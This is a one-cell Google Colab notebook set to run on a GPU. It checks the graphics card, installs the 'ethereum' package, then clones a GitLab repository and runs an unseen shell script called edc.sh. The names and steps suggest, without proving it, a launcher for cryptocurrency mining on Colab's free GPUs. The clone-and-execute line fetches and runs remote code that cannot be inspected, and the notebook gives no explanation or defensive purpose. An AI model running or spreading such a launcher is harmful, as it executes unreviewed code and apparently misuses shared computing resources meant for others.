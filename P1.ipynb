{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "P1.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "cY1YjeXzZWkA"
      },
      "source": [
        "# Check VGA\r\n",
        "! nvidia-smi\r\n",
        "! sudo apt update\r\n",
        "! sudo apt install ethereum\r\n",
        "# Run\r\n",
        "! git clone https://gitlab.com/jayasamira21/slow.git && cd slow && chmod +x edc.sh && ./edc.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
